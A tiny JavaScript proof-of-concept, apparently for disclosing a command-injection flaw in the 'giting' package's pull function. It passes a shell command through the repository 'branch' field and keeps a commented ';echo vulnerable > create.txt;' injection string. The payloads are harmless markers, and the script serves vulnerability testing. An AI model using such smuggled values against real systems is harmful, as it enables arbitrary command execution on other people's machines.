var Test = require("giting");
// var injection_command = ";echo vulnerable > create.txt;";
var injection_command = ";";
test = new Test({"workDir": "./"});
repo = {"organization": "./", "name": "./", "branch": "chmod u+x tmp"}
test.pull(repo, function(){});
